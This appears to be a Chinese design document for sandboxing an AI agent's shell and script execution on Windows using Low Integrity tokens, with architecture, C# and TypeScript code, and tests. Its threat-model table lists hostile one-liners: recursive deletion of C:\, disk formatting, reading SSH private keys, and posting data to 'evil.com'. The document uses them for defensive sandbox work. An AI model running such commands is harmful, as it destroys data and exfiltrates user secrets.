# Windows 沙盒隔离设计方案

> **版本**: 1.0  
> **日期**: 2026-05-05  
> **状态**: 设计阶段  
> **依赖**: 预编译 Low Integrity Launcher (low-launcher.exe)

---

## 目录

1. [背景与动机](#1-背景与动机)
2. [威胁模型分析](#2-威胁模型分析)
3. [方案选型与技术原理](#3-方案选型与技术原理)
4. [架构设计](#4-架构设计)
5. [low-launcher.exe 设计](#5-low-launcherexe-设计)
6. [SandboxService 实现要点](#6-sandboxservice-实现要点)
7. [现有代码改造清单](#7-现有代码改造清单)
8. [编译与打包流程](#8-编译与打包流程)
9. [测试验证方案](#9-测试验证方案)
10. [安全边界与局限性](#10-安全边界与局限性)
11. [扩展：Linux/macOS 适配预留](#11-linuxmacos-适配预留)
12. [附录：关键代码参考](#12-附录关键代码参考)

---

## 1. 背景与动机

### 1.1 问题描述

当前系统允许 LLM Agent 通过两条路径执行任意代码：

- **[ShellToolProvider](file:///d:\AI\ai_chat\backend-ts\src\modules\tools\providers\shell-tool.provider.ts)** — 使用 `child_process.exec()` 直接在系统 shell 中执行命令，暴露 `shell__execute_command` 工具给 AI
- **[SkillScriptExecutor](file:///d:\AI\ai_chat\backend-ts\src\modules\skills\execution\skill-script-executor.service.ts)** — 使用 `child_process.spawn()` 执行 Skill 附带的 Python/Node/Shell 脚本

二者均以当前进程的 Medium Integrity Level 运行，**完全不受限制**：

- 可读写 `C:\Windows`、`C:\Program Files` 等系统目录
- 可访问用户目录下的敏感文件（`.ssh`、`.aws`、`.npmrc` 等）
- 环境变量 `{...process.env}` 全量泄漏给子进程（API Key、数据库密码等）
- 脚本可通过 Python 的 `os.system()` / `subprocess.run()` 绕过任何文本级别的命令过滤

### 1.2 目标

在不依赖 Docker、Windows Sandbox 或第三方安全软件的前提下，实现一个**轻量级进程沙盒**：

- ✅ 子进程（Python/Node/Shell）只能写入 Agent 专属工作区目录
- ✅ 子进程无法写入系统目录和用户配置文件
- ✅ 环境变量白名单脱敏
- ✅ 明确的防御边界和可测试的失败场景
- ✅ 零外部运行时依赖（仅需随应用分发的预编译 EXE）
- ✅ 个人电脑（Windows 所有版本，含 Home 版）开箱即用

---

## 2. 威胁模型分析

### 2.1 攻击面

```
用户消息 → LLM → Tool Call → ToolOrchestrator
                                  │
                    ┌─────────────┼─────────────┐
                    ▼                           ▼
           shell__execute_command      SkillScriptExecutor
           (exec / spawn)              (spawn python/node/bash)
                    │                           │
                    └───────────┬───────────────┘
                                ▼
                         子进程（Medium IL）
                                │
                    ┌───────────┼───────────┐
                    ▼           ▼           ▼
               文件系统写    网络访问    进程操作
              （无限制）    （无限制）   （无限制）
```

### 2.2 攻击向量分级

| 等级 | 攻击向量 | 当前风险 | 沙盒后 |
|------|---------|:-------:|:-----:|
| 🔴 严重 | `del /F /S /Q C:\*` — 删除系统文件 | 可执行 | ✅ 阻断 |
| 🔴 严重 | `python -c "open('C:\\Windows\\System32\\hosts','w')"` — 覆写系统文件 | 可执行 | ✅ 阻断 |
| 🔴 严重 | `python -c "import os; os.system('format D:')"` — 格式化磁盘 | 可执行 | ✅ 阻断 |
| 🟠 高 | `python -c "open('C:\\Users\\x\\.ssh\\id_rsa').read()"` — 窃取密钥 | 可执行 | ⚠️ 可读不可写 |
| 🟠 高 | `python -c "import requests; requests.post('evil.com', data=...)"` — 数据外传 | 可执行 | ⚠️ 不阻断网络 |
| 🟡 中 | `python -c "while True: pass"` — CPU 耗尽 | 可执行 | ✅ 超时 + 级联 kill |
| 🟡 中 | `python -c "print('x'*10**9)"` — 内存/输出炸弹 | 可执行 | ✅ 输出截断 |
| 🟢 低 | 环境变量泄漏 API Key | 全量泄漏 | ✅ 白名单脱敏 |

> **关键理解**：低完整性级别 (Low IL) 的进程天然**可读** Medium IL 对象（文件、注册表），但**不可写**。因此本方案的核心防护面是"写入破坏"，数据窃取（读取后用网络外传）需要额外措施（见第 10 节）。

---

## 3. 方案选型与技术原理

### 3.1 为什么不用纯 Node.js 方案

| 方案 | 局限性 |
|------|--------|
| 命令黑名单正则匹配 | 对 Python 脚本内的 `os.system()` 完全无效 |
| VM2 / isolated-vm | 仅限 JS，不适用于子进程 |
| Docker / Podman | 需要安装并运行守护进程，对个人电脑太重 |
| Windows Sandbox | 仅 Win 10/11 Pro/Enterprise，不含 Home |

### 3.2 Windows Mandatory Integrity Control (MIC)

Windows 从 Vista 开始引入 MIC，将安全主体分为 4 个强制完整性级别：

```
System (最高)     ← 系统服务、内核
High              ← 管理员进程
Medium            ← 普通用户进程（桌面应用默认）
Low               ← 受限进程（浏览器沙盒、AppContainer）
Untrusted         ← 匿名/来宾
```

MIC 的核心规则（不可绕过，由内核强制执行）：

- **不可向上写**：Low 进程**永远**无法写入 Medium/High/System 级别的安全对象
- **可向上读**：Low 进程**可以**读取 Medium 级别的文件（除非设置了显式 ACL 拒绝）
- **同级读写**：Low 进程可以在 Low 级别的目录中自由读写

这意味着：**如果子进程以 Low Integrity 运行，并且工作区目录被标记为 Low，那么子进程只能在工作区内写入，系统目录天然不可写。**

### 3.3 预编译 EXE 方案原理

```
┌──────────────────────────────────────────────────────────────┐
│                      Node.js (Medium IL)                     │
│                                                              │
│  SandboxService.executeScript(sessionId, scriptPath, args)   │
│    │                                                         │
│    │  1. 获取工作区路径: workspace/{sessionId}/               │
│    │  2. 确保工作区存在 + 标记为 Low Integrity                │
│    │  3. 脱敏环境变量（只传白名单）                            │
│    │                                                         │
│    ▼                                                         │
│  child_process.spawn(                                        │
│    'low-launcher.exe',    ← 预编译的 EXE                      │
│    ['python', 'script.py', '--arg', 'value'],                │
│    { cwd: 'workspace/{sessionId}/', env: safeEnv }           │
│  )                                                           │
│    │                                                         │
│    │  low-launcher.exe 内部:                                  │
│    │  1. 获取当前进程 Token (Medium)                          │
│    │  2. DuplicateTokenEx → 复制一份                          │
│    │  3. SetTokenInformation → 将副本降为 Low Integrity       │
│    │  4. CreateProcessAsUser → 用 Low Token 启动子进程         │
│    │  5. 管道转发 stdout/stderr 给父进程(Node.js)              │
│    │  6. WaitForSingleObject → 等待子进程退出                  │
│    │  7. 退出并返回子进程的 exit code                          │
│    │                                                         │
│    ▼                                                         │
│  python.exe (Low IL)  ← 无法写入 Medium 及以上目录             │
│    ├─ 可在 workspace/{sessionId}/ 内自由读写（已标记 Low）      │
│    ├─ 尝试写 C:\Windows\  → ACCESS_DENIED                     │
│    ├─ 尝试写 C:\Users\x\.ssh\ → ACCESS_DENIED                 │
│    └─ 尝试写 HKCU 注册表 → ACCESS_DENIED                      │
└──────────────────────────────────────────────────────────────┘
```

### 3.4 关键 Win32 API

| API | 作用 | 对应 low-launcher.exe 中的用途 |
|-----|------|-------------------------------|
| `OpenProcessToken` | 获取当前进程 Token | 拿到 Medium Token |
| `DuplicateTokenEx` | 复制 Token（保留权限子集） | 创建一个可修改的副本 |
| `SetTokenInformation` + `TOKEN_INFORMATION_CLASS.TokenIntegrityLevel` | 修改 Token 完整性级别 | 将副本降为 Low |
| `CreateProcessAsUserW` | 以指定 Token 启动进程 | 用 Low Token 启动目标程序 |
| `CreatePipe` + `STARTUPINFO.hStdOutput/hStdError` | 创建管道捕获输出 | 将子进程输出转发给 Node.js |

---

## 4. 架构设计

### 4.1 模块结构

```
src/common/services/sandbox/
├── sandbox.module.ts                  # NestJS 模块定义（全局）
├── sandbox.service.ts                 # 核心沙盒服务（统一入口）
├── sandbox-backend.interface.ts       # 可插拔后端抽象接口
├── path-jail.ts                       # 路径监狱工具（纯函数）
├── env-sanitizer.ts                   # 环境变量脱敏（纯函数）
├── script-type-detector.ts            # 脚本类型检测（.py → python, .js → node）
└── backends/
    └── windows-low-integrity.backend.ts  # Windows Low Integrity 后端
```

### 4.2 系统集成架构图

```
┌──────────────────────────────────────────────────────────────────────┐
│                         系统集成架构                                  │
│                                                                      │
│  ┌─────────────────────┐    ┌─────────────────────────────────────┐ │
│  │   ToolsModule        │    │   SkillsModule                      │ │
│  │                     │    │                                     │ │
│  │  ShellToolProvider ─┼────┼─→ SkillScriptExecutor               │ │
│  │       │             │    │       │                              │ │
│  │       │ executeCmd  │    │       │ execute                      │ │
│  │       ▼             │    │       ▼                              │ │
│  │  ┌─────────────────┐│    │  ┌─────────────────────────────────┐│ │
│  │  │ (直接调用沙盒)   ││    │  │ (直接调用沙盒)                   ││ │
│  └──┴───────┬─────────┴┘    └──┴──────────────┬──────────────────┴┘ │
│             │                                  │                     │
│  ┌──────────▼──────────────────────────────────▼──────────────────┐ │
│  │                    SandboxService (共享模块)                    │ │
│  │                                                                 │ │
│  │  executeCommand(sessionId, command, opts)                       │ │
│  │  executeScript(sessionId, scriptPath, args, opts)               │ │
│  │  resolveJailedPath(sessionId, requestPath, operation)           │ │
│  │                                                                 │ │
│  │  ┌───────────────────────────────────────────────────────────┐ │ │
│  │  │              WindowsLowIntegrityBackend                   │ │ │
│  │  │                                                           │ │ │
│  │  │  prepare(sessionId) → 确保工作区 + Low 标记                 │ │ │
│  │  │  execute(cmd, args, cwd, env, timeout) → spawn launcher   │ │ │
│  │  │  cleanup(sessionId) → 清理工作区                           │ │ │
│  │  └───────────────────────────────────────────────────────────┘ │ │
│  └────────────────────────────────────────────────────────────────┘ │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │                     文件系统层                                  │ │
│  │                                                                │ │
│  │  workspace/                        ← WORKSPACE_BASE_DIR        │ │
│  │  ├── {sessionId-1}/                ← Low Integrity 标记        │ │
│  │  │   ├── script.py                                             │ │
│  │  │   └── output.json                                           │ │
│  │  └── {sessionId-2}/                ← Low Integrity 标记        │ │
│  │                                                                │ │
│  │  build-resources/                                              │ │
│  │  └── launchers/                                                │ │
│  │      └── low-launcher.exe          ← 预编译沙盒启动器           │ │
│  └────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────┘
```

### 4.3 核心接口

```typescript
// ======== sandbox-backend.interface.ts ========
export interface SandboxExecuteOptions {
  timeoutMs: number;
  maxOutputBytes: number;
  env?: Record<string, string>;
}

export interface SandboxResult {
  exitCode: number;
  stdout: string;
  stderr: string;
  timedOut: boolean;
  truncated: boolean;
  durationMs: number;
}

export type PathOperation = 'read' | 'write';

export interface ISandboxBackend {
  readonly name: string;
  available(): Promise<boolean>;
  prepare(sessionId: string): Promise<string>;
  execute(
    command: string,
    args: string[],
    cwd: string,
    env: Record<string, string>,
    options: SandboxExecuteOptions,
  ): Promise<SandboxResult>;
  cleanup(sessionId: string): Promise<void>;
}

// ======== sandbox.service.ts 对外接口 ========
@Injectable()
export class SandboxService {
  // 以沙盒模式执行命令行（ShellToolProvider 调用）
  async executeCommand(
    sessionId: string,
    command: string,
    options: SandboxExecuteOptions,
  ): Promise<SandboxResult>;

  // 以沙盒模式执行脚本文件（SkillScriptExecutor 调用）
  async executeScript(
    sessionId: string,
    scriptPath: string,
    args: string[],
    options: SandboxExecuteOptions,
  ): Promise<SandboxResult>;

  // 解析路径并确保在监狱范围内
  resolveJailedPath(
    sessionId: string,
    requestedPath: string,
    operation: PathOperation,
  ): string;

  // 清理会话工作区
  async cleanupSession(sessionId: string): Promise<void>;
}
```

---

## 5. low-launcher.exe 设计

### 5.1 功能规格

| 项目 | 规格 |
|------|------|
| **语言** | C# (.NET Framework 4.6.2+) |
| **目标平台** | Windows x64 |
| **预期大小** | ~10–15 KB（编译后） |
| **运行时依赖** | 无（完全自包含，仅依赖系统 .NET Framework） |
| **输入** | 命令行参数：`low-launcher.exe <target_exe> [args...]` |
| **输出** | 目标进程的 stdout → 自身 stdout；stderr → 自身 stderr |
| **退出码** | 目标进程的退出码（失败时返回 1） |

### 5.2 执行流程

```
low-launcher.exe python script.py --verbose
│
├── 1. 解析命令行参数
│     targetExe = "python"
│     targetArgs = ["script.py", "--verbose"]
│
├── 2. OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &token)
│     拿到当前进程（Node.js, Medium IL）的 Token 句柄
│
├── 3. DuplicateTokenEx(token, TOKEN_ADJUST_DEFAULT, NULL,
│       SecurityImpersonation, TokenPrimary, &newToken)
│     复制一个可修改的主 Token
│
├── 4. 构造 TOKEN_MANDATORY_LABEL 结构体
│     { Label: { Sid: S-1-16-4096 (Low Mandatory Level) } }
│
├── 5. SetTokenInformation(newToken, TokenIntegrityLevel, &tml, sizeof(tml))
│     将 Token 的完整性级别降为 Low
│
├── 6. 创建匿名管道 (stdoutPipe, stderrPipe)
│     用于捕获子进程的输出
│
├── 7. CreateProcessAsUserW(newToken, targetExe, cmdLine, ...)
│     以 Low Token 启动目标进程
│     - 子进程自动继承 Low Integrity Level
│     - 子进程在工作目录 (由 Node.js 的 cwd 参数控制) 下运行
│
├── 8. 异步读取 stdout/stderr 管道 → 写入自己的 stdout/stderr
│
├── 9. WaitForSingleObject(processInfo.hProcess, INFINITE)
│     等待子进程退出
│
├── 10. GetExitCodeProcess → 获取退出码
│
└── 11. 清理句柄, 返回退出码
```

### 5.3 源码关键结构（C#）

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

class LowLauncher
{
    // Win32 API 声明
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle,
        uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr ExistingToken,
        uint DesiredAccess, IntPtr TokenAttributes,
        int ImpersonationLevel, int TokenType, out IntPtr NewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool SetTokenInformation(IntPtr TokenHandle,
        int TokenInfoClass, IntPtr TokenInfo, int TokenInfoLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(
        IntPtr Token, string ApplicationName, string CommandLine,
        IntPtr ProcessAttributes, IntPtr ThreadAttributes,
        bool InheritHandles, uint CreationFlags,
        IntPtr Environment, string CurrentDirectory,
        ref STARTUPINFO StartupInfo, out PROCESS_INFORMATION ProcessInfo);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr Handle);

    // 常量
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ADJUST_DEFAULT = 0x0080;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const int TokenIntegrityLevel = 25;
    const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;

    static readonly IntPtr LowMandatorySid = BuildLowIntegritySid();

    static int Main(string[] args)
    {
        // ... 实现上述流程
    }
}
```

完整源码将单独存放在 `scripts/low-launcher/low-launcher.cs`。

### 5.4 错误处理策略

| 场景 | 行为 |
|------|------|
| 参数不足 (没有目标程序) | 输出错误信息到 stderr，退出码 = 1 |
| `OpenProcessToken` 失败 | 输出 Win32 错误信息，退出码 = 1 |
| `DuplicateTokenEx` 失败 | 输出 Win32 错误信息，退出码 = 1 |
| `SetTokenInformation` 失败 | 输出 Win32 错误信息，退出码 = 1 |
| `CreateProcessAsUser` 失败 | 输出 Win32 错误信息，退出码 = 1 |
| 目标程序找不到 | 输出 "command not found"，退出码 = 1 |
| 子进程崩溃 | 退出码 = 子进程的崩溃退出码 |

### 5.5 关键注意事项

1. **SID 构造**：`S-1-16-4096` 是 Low Mandatory Level 的已知 SID。必须通过 `AllocateAndInitializeSid` + `SECURITY_MANDATORY_LABEL_AUTHORITY` + `SECURITY_MANDATORY_LOW_RID` 构造，不可硬编码字节。

2. **CloseHandle 清理**：所有 Token 句柄、管道句柄、进程/线程句柄必须在所有退出路径上调用 `CloseHandle`，防止句柄泄漏。

3. **管道转发是异步的**：不能简单同步 `ReadToEnd`，因为管道缓冲区满时会导致子进程阻塞。需要用一个单独的线程读取管道。推荐使用 `ThreadPool.QueueUserWorkItem` 或 `async/await` + `StreamReader.ReadToEndAsync`。

4. **CreateProcessAsUser 需要环境块**：如果父进程（Node.js）设置了自定义环境变量，需要通过 `CREATE_UNICODE_ENVIRONMENT` 标志和 `Environment` 参数传递。

---

## 6. SandboxService 实现要点

### 6.1 launcher.exe 路径解析

```typescript
// sandbox.service.ts
private resolveLauncherPath(): string {
  const isDev = !(process as any).pkg; // 或通过其他方式判断
  const base = isDev
    ? path.join(process.cwd(), 'build-resources', 'launchers')
    : path.join(process.resourcesPath, 'build-resources', 'launchers');

  const exePath = path.join(base, 'low-launcher.exe');
  if (!fs.existsSync(exePath)) {
    throw new Error(
      `low-launcher.exe not found at ${exePath}. ` +
      `Ensure the launcher is compiled and placed in build-resources/launchers/.`
    );
  }
  return exePath;
}
```

> **注意**：在 Electron 打包后，资源文件通过 `process.resourcesPath` 访问。需要在 `package.json` 的 `extraResources` 中声明：
>
> ```json
> "extraResources": [
>   {
>     "from": "build-resources/launchers",
>     "to": "build-resources/launchers"
>   }
> ]
> ```

### 6.2 执行流程（executeScript）

```typescript
async executeScript(
  sessionId: string,
  scriptPath: string,
  args: string[],
  options: SandboxExecuteOptions,
): Promise<SandboxResult> {
  // Step 1: 准备沙盒工作区
  const jailDir = await this.backend.prepare(sessionId);

  // Step 2: 检测脚本类型 → 找到解释器
  const ext = path.extname(scriptPath).toLowerCase();
  const interpreter = this.detectInterpreter(ext);
  if (!interpreter) {
    throw new Error(`Unsupported script type: ${ext}`);
  }

  // Step 3: 脱敏环境变量
  const safeEnv = sanitizeEnv(options.env);

  // Step 4: 委托给后端执行
  const startTime = Date.now();
  const result = await this.backend.execute(
    interpreter,                                    // "python"
    [scriptPath, ...args],                          // ["script.py", "--verbose"]
    jailDir,                                        // cwd = 工作区
    safeEnv,
    options,
  );

  return {
    ...result,
    durationMs: Date.now() - startTime,
  };
}
```

### 6.3 执行流程（executeCommand）

```typescript
async executeCommand(
  sessionId: string,
  command: string,
  options: SandboxExecuteOptions,
): Promise<SandboxResult> {
  const jailDir = await this.backend.prepare(sessionId);
  const safeEnv = sanitizeEnv(options.env);

  // 命令解析：区分 "python script.py" 和 "echo hello"
  // 使用 shell-quote 或简单的 split 解析
  const parts = parseCommand(command);

  return this.backend.execute(
    parts[0],                    // "python" 或 "echo"
    parts.slice(1),              // ["script.py"] 或 ["hello"]
    jailDir,
    safeEnv,
    options,
  );
}
```

### 6.4 路径监狱（Path Jail）

```typescript
/**
 * 将用户请求的路径解析到工作区监狱内。
 * 绝对路径如果在工作区外 → 拒绝（写操作）或允许但记录日志（读操作可配置）。
 */
resolveJailedPath(
  sessionId: string,
  requestedPath: string,
  operation: PathOperation,
): string {
  const jailRoot = this.workspaceService.getWorkspaceDir(sessionId);
  const resolved = path.resolve(
    path.isAbsolute(requestedPath) ? requestedPath : path.join(jailRoot, requestedPath)
  );

  // 写操作：严格限制在工作区内
  if (operation === 'write') {
    if (!resolved.startsWith(jailRoot)) {
      throw new SandboxError(
        'PATH_ESCAPE',
        `Write denied: ${requestedPath} is outside the sandbox jail. ` +
        `All write operations must be within ${jailRoot}.`
      );
    }
  }

  // 读操作：默认也限制在工作区内
  // 后续可扩展为白名单机制（如允许读取系统安装的 Python 库路径）
  if (operation === 'read') {
    if (!resolved.startsWith(jailRoot)) {
      throw new SandboxError(
        'PATH_ESCAPE',
        `Read denied: ${requestedPath} is outside the sandbox jail.`
      );
    }
  }

  return resolved;
}
```

### 6.5 环境变量脱敏

```typescript
// env-sanitizer.ts

/** 允许透传给子进程的环境变量白名单 */
const ALLOWED_ENV_KEYS = new Set([
  // 系统基础
  'PATH', 'PATHEXT', 'SystemRoot', 'SystemDrive',
  'TEMP', 'TMP', 'USERPROFILE', 'HOME', 'HOMEDRIVE', 'HOMEPATH',
  'COMPUTERNAME', 'USERNAME', 'USERDOMAIN',
  // 区域与编码
  'LANG', 'LC_ALL', 'LC_CTYPE',
  // Python
  'PYTHONPATH', 'PYTHONHOME', 'PYTHONIOENCODING', 'PYTHONUNBUFFERED',
  'PIP_REQUIRE_VIRTUALENV',
  // Node.js
  'NODE_PATH', 'NPM_CONFIG_PREFIX',
  // 会话信息
  'SESSION_ID', 'WORKSPACE_DIR',
  // 自定义传递
  ...(process.env.SANDBOX_EXTRA_ENV?.split(',') || []),
]);

export function sanitizeEnv(customEnv?: Record<string, string>): Record<string, string> {
  const safe: Record<string, string> = {};

  // 只复制白名单中的变量
  for (const key of ALLOWED_ENV_KEYS) {
    if (process.env[key] !== undefined) {
      safe[key] = process.env[key]!;
    }
  }

  // 合并调用方显式传入的自定义变量
  if (customEnv) {
    Object.assign(safe, customEnv);
  }

  // 强制设置：确保 Python 输出不被缓冲
  safe['PYTHONUNBUFFERED'] = '1';

  return safe;
}
```

### 6.6 脚本类型检测

```typescript
// script-type-detector.ts

const SCRIPT_INTERPRETERS: Record<string, string> = {
  '.py': 'python',
  '.js': 'node',
  '.sh': 'bash',
  '.ps1': 'powershell',
  '.bat': 'cmd',
  '.cmd': 'cmd',
};

export function detectInterpreter(ext: string): string | null {
  const normalized = ext.toLowerCase();
  return SCRIPT_INTERPRETERS[normalized] || null;
}
```

---

## 7. 现有代码改造清单

### 7.1 改造总览

| 文件 | 操作 | 说明 |
|------|:----:|------|
| `src/common/services/shared.module.ts` | 修改 | 注册 `SandboxService` 和 `WindowsLowIntegrityBackend` |
| `src/common/services/workspace.service.ts` | 修改 | 新增 `ensureWorkspaceDir(sessionId)` 方法 |
| `src/modules/tools/providers/shell-tool.provider.ts` | 修改 | `handleExecuteCommand`、文件操作走沙盒 |
| `src/modules/skills/execution/skill-script-executor.service.ts` | 修改 | `execute()` 走沙盒 |
| `src/common/services/sandbox/sandbox.service.ts` | 新增 | 核心沙盒服务 |
| `src/common/services/sandbox/sandbox-backend.interface.ts` | 新增 | 后端抽象接口 |
| `src/common/services/sandbox/sandbox.module.ts` | 新增 | NestJS 模块 |
| `src/common/services/sandbox/path-jail.ts` | 新增 | 路径监狱 |
| `src/common/services/sandbox/env-sanitizer.ts` | 新增 | 环境变量脱敏 |
| `src/common/services/sandbox/script-type-detector.ts` | 新增 | 脚本类型检测 |
| `src/common/services/sandbox/backends/windows-low-integrity.backend.ts` | 新增 | Windows 后端 |
| `scripts/low-launcher/low-launcher.cs` | 新增 | Launcher 源码 |
| `build-resources/launchers/low-launcher.exe` | 新增 | 编译产物（随应用分发） |

### 7.2 ShellToolProvider 具体改动

**文件**: [shell-tool.provider.ts](file:///d:\AI\ai_chat\backend-ts\src\modules\tools\providers\shell-tool.provider.ts)

**改动 1: 注入 SandboxService**

```typescript
// 原代码
constructor(private workspaceService: WorkspaceService) {}

// 改后
constructor(
  private workspaceService: WorkspaceService,
  private sandbox: SandboxService,
) {}
```

**改动 2: handleExecuteCommand — execAsync → sandbox**

```typescript
// 原代码（L232-L237 附近）
const { stdout, stderr } = await execAsync(command, options);

// 改后
const result = await this.sandbox.executeCommand(
  context?.session_id,
  command,
  {
    timeoutMs: 120000,
    maxOutputBytes: 10 * 1024 * 1024,
  }
);

return JSON.stringify({
  stdout: result.stdout.trim(),
  stderr: result.stderr.trim(),
  exitCode: result.exitCode,
});
```

**改动 3: 文件操作 — 统一走路径监狱**

```typescript
// 原 resolvePath 方法
private resolvePath(filePath: string, context?: Record<string, any>): string {
  // ... 现有逻辑
}

// 改后：读文件
private async handleReadFile(args: any, context?: Record<string, any>): Promise<string> {
  const jailedPath = this.sandbox.resolveJailedPath(
    context?.session_id, args.file_path, 'read'
  );
  // ... 后续用 jailedPath 代替 resolvedPath
}

// 改后：写文件
private async handleWriteFile(args: any, context?: Record<string, any>): Promise<string> {
  const jailedPath = this.sandbox.resolveJailedPath(
    context?.session_id, args.file_path, 'write'
  );
  // ... 后续用 jailedPath 代替 resolvedPath
}
```

### 7.3 SkillScriptExecutor 具体改动

**文件**: [skill-script-executor.service.ts](file:///d:\AI\ai_chat\backend-ts\src\modules\skills\execution\skill-script-executor.service.ts)

```typescript
// 原代码（L15-L16 附近）
constructor(private workspaceService: WorkspaceService) {}

// 改后
constructor(
  private workspaceService: WorkspaceService,
  private sandbox: SandboxService,
) {}

// 原 execute 方法核心逻辑（L54-L60 附近）
const child = spawn(command, args, {
  cwd,
  env: { ...process.env, ...request.env },
  stdio: ['pipe', 'pipe', 'pipe'],
});

// 改后
async execute(request: ScriptExecutionRequest, context?: Record<string, any>): Promise<ScriptExecutionResult> {
  const sessionId = context?.sessionId || request.skillId;

  return this.sandbox.executeScript(
    sessionId,
    request.scriptPath,
    request.args || [],
    {
      timeoutMs: request.timeoutMs || 30000,
      maxOutputBytes: request.maxOutputBytes || 1024 * 1024,
      env: request.env,
    }
  );
}
```

### 7.4 WorkspaceService 补充

**文件**: [workspace.service.ts](file:///d:\AI\ai_chat\backend-ts\src\common\services\workspace.service.ts)

新增方法供后端调用来确保工作区目录存在：

```typescript
/**
 * 确保会话工作目录存在并返回路径
 * 与 getWorkspaceDir 不同的是：此方法会创建目录
 */
ensureWorkspaceDir(sessionId: string): string {
  const sessionDir = this.getWorkspaceDir(sessionId);
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }
  return sessionDir;
}
```

---

## 8. 编译与打包流程

### 8.1 low-launcher.exe 编译

**编译命令**（使用系统自带的 C# 编译器，需要 Visual Studio Build Tools 或 .NET SDK）：

```powershell
# 方式 A：使用 csc.exe（Visual Studio 自带，路径在 C:\Windows\Microsoft.NET\Framework64\v4.x\)
csc /target:exe /platform:x64 /out:build-resources/launchers/low-launcher.exe scripts/low-launcher/low-launcher.cs

# 方式 B：使用 dotnet SDK 的 Roslyn 编译器
dotnet publish scripts/low-launcher/low-launcher.csproj -c Release -r win-x64 -o build-resources/launchers/
```

> **注意事项**：
> - 编译结果 ~10-15 KB，完全自包含（仅依赖系统 .NET Framework）
> - Windows 10/11 自带 .NET Framework 4.8，无需额外安装
> - 推荐使用 `csc.exe`（方式 A），产物体积最小、无运行时依赖
> - 如果开发机器没有 `csc`，项目应提供 `low-launcher.csproj` 作为备选编译方式

### 8.2 项目编译脚本集成

在根目录 `package.json` 中新增编译命令（或在 `.bat` 脚本中）：

```json
{
  "scripts": {
    "build:launcher": "csc /target:exe /platform:x64 /out:build-resources/launchers/low-launcher.exe scripts/low-launcher/low-launcher.cs",
    "prebuild:electron": "npm run build:launcher"
  }
}
```

或者在 `build-resources/` 下新增 `build-launcher.bat`：

```batch
@echo off
echo Building low-launcher.exe...
if not exist "%~dp0launchers" mkdir "%~dp0launchers"

REM 尝试找到 csc.exe
set CSC_PATH=
for /f "tokens=*" %%i in ('where csc 2^>nul') do set CSC_PATH=%%i

if "%CSC_PATH%"=="" (
    echo ERROR: csc.exe not found.
    echo Please install Visual Studio Build Tools or .NET Framework SDK.
    exit /b 1
)

csc /target:exe /platform:x64 /out:build-resources/launchers/low-launcher.exe scripts/low-launcher/low-launcher.cs
echo Done: build-resources/launchers/low-launcher.exe
```

### 8.3 Electron 打包配置

在根 `package.json` 的 `build.extraResources` 中确保 launcher 被包含：

```json
{
  "build": {
    "extraResources": [
      {
        "from": "build-resources/launchers",
        "to": "build-resources/launchers"
      }
    ]
  }
}
```

### 8.4 运行时路径解析

```typescript
// 开发模式：项目根目录
// 打包模式：process.resourcesPath
function getLauncherDir(): string {
  if (app.isPackaged) {
    return path.join(process.resourcesPath, 'build-resources', 'launchers');
  }
  return path.join(process.cwd(), 'build-resources', 'launchers');
}
```

---

## 9. 测试验证方案

### 9.1 单元测试（Node.js）

```typescript
// sandbox.service.spec.ts
describe('SandboxService', () => {
  let sandbox: SandboxService;
  const testSessionId = 'test-session-' + Date.now();

  afterAll(async () => {
    await sandbox.cleanupSession(testSessionId);
  });

  it('should execute python script in sandbox', async () => {
    const scriptPath = path.join(__dirname, 'fixtures', 'hello.py');
    const result = await sandbox.executeScript(
      testSessionId,
      scriptPath,
      [],
      { timeoutMs: 5000, maxOutputBytes: 1024 * 1024 }
    );
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('Hello');
  });

  it('should deny writing outside jail', async () => {
    // 构造一个尝试写入 C:\Windows\ 的 Python 脚本
    const result = await sandbox.executeCommand(
      testSessionId,
      'python -c "open(\'C:\\\\Windows\\\\test_sandbox.txt\',\'w\').write(\'x\')"',
      { timeoutMs: 5000, maxOutputBytes: 1024 * 1024 }
    );
    // Low Integrity 子进程写入 Medium 目录 → 被 OS 拒绝
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toMatch(/Permission|Access.*denied/i);
  });

  it('should deny writing to user profile', async () => {
    const result = await sandbox.executeCommand(
      testSessionId,
      `python -c "open('${process.env.USERPROFILE}\\\\test_sandbox.txt','w').write('x')"`,
      { timeoutMs: 5000, maxOutputBytes: 1024 * 1024 }
    );
    expect(result.exitCode).not.toBe(0);
  });

  it('should allow writing inside workspace', async () => {
    const result = await sandbox.executeCommand(
      testSessionId,
      'python -c "open(\'test_output.txt\',\'w\').write(\'ok\')"',
      { timeoutMs: 5000, maxOutputBytes: 1024 * 1024 }
    );
    expect(result.exitCode).toBe(0);
  });

  it('should timeout long-running scripts', async () => {
    const result = await sandbox.executeCommand(
      testSessionId,
      'python -c "import time; time.sleep(30)"',
      { timeoutMs: 1000, maxOutputBytes: 1024 * 1024 }
    );
    expect(result.timedOut).toBe(true);
  });

  it('should truncate excessive output', async () => {
    const result = await sandbox.executeCommand(
      testSessionId,
      'python -c "print(\'x\' * 2000000)"',
      { timeoutMs: 5000, maxOutputBytes: 1024 * 100 }
    );
    expect(result.truncated).toBe(true);
    expect(result.stdout.length).toBeLessThanOrEqual(1024 * 100);
  });

  it('should not leak sensitive env vars', async () => {
    const result = await sandbox.executeCommand(
      testSessionId,
      'python -c "import os; print(os.environ.get(\'DATABASE_URL\', \'NOT_SET\'))"',
      { timeoutMs: 5000, maxOutputBytes: 1024 * 1024 }
    );
